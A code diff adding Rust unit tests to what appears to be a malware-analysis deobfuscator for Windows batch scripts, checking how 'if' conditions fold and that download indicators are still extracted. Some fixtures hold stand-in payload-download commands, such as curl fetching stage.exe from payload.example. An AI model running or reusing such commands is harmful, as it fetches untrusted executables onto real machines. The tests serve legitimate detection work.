@@ -11880,6 +11880,54 @@ if "a"=="a" %COMSPEC% /V:ON /c "set U=https://if-escaped.example/payload.exe&&cu
     }
 
     #[test]
+    fn if_not_exist_empty_quoted_operand_resolves_true() {
+        let script = br#"if not exist "" echo empty-missing
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo empty-missing"),
+            "empty quoted if-exist operand should resolve false before NOT:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition } if condition.contains("exist \"\"")
+            )),
+            "empty quoted if-exist operand should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_not_exist_unknown_quoted_path_with_spaces_does_not_skip_later_iocs() {
+        let script = br#"if not exist "C:\Program Files\missing marker" goto ownpc
+curl https://payload.example/stage.exe -o stage.exe
+:ownpc
+echo done
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("curl https://payload.example/stage.exe -o stage.exe"),
+            "unknown quoted path with spaces should not be assumed absent and skip later IOCs:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::Download { src, .. }
+                    if src == "https://payload.example/stage.exe"
+            )),
+            "later download IOC should still be extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn if_exist_current_dir_path_resolves_tracked_file() {
         let script = br#"echo marker>gate.txt
 if exist .\gate.txt set MARK=found
@@ -12428,6 +12476,46 @@ mod if_constant_fold_tests {
     }
 
     #[test]
+    fn if_slash_i_not_order_is_case_insensitive_negated() {
+        let script = b"if /I not \"script.bat\"==\"other.bat\" set MARK=value\r\nif /I not \"script.bat\"==\"SCRIPT.BAT\" set MARK=bad\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "negated case-insensitive comparison did not run inline body:\n{}",
+            report.deobfuscated
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "/I before NOT should fold cleanly: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_top_level_percent_one_defaults_empty() {
+        let script = b"if \"%1\"==\"\" set MARK=empty\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo empty"),
+            "top-level %1 should fold to empty and run inline body:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition } if condition.contains("%1")
+            )),
+            "top-level %1 condition should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn if_gtr_lss_geq_leq() {
         for (op, expected_unresolved) in [
             ("gtr 5", false),
@@ -12449,6 +12537,66 @@ mod if_constant_fold_tests {
         assert_eq!(
             unresolved_count, 0,
             "all 4 relational ops should fold cleanly"
+        );
+    }
+
+    #[test]
+    fn if_percent_errorlevel_geq_zero_inline_set_is_constant_true() {
+        let script = b"if %ERRORLEVEL% GEQ 0 set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "inline set did not run, got:\n{}",
+            report.deobfuscated
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "invariant errorlevel GEQ 0 should fold true: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_errorlevel_zero_inline_set_is_constant_true() {
+        let script = b"if errorlevel 0 set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "inline set did not run, got:\n{}",
+            report.deobfuscated
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "errorlevel 0 should fold true: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_errorlevel_nonzero_stays_unresolved() {
+        let script = b"if errorlevel 1 echo MAYBE\r\necho AFTER\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition }
+                    if condition == "errorlevel 1 echo MAYBE"
+            )),
+            "dynamic errorlevel threshold should stay unresolved: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("echo AFTER"),
+            "following line should remain visible, got:\n{}",
+            report.deobfuscated
         );
     }
 }
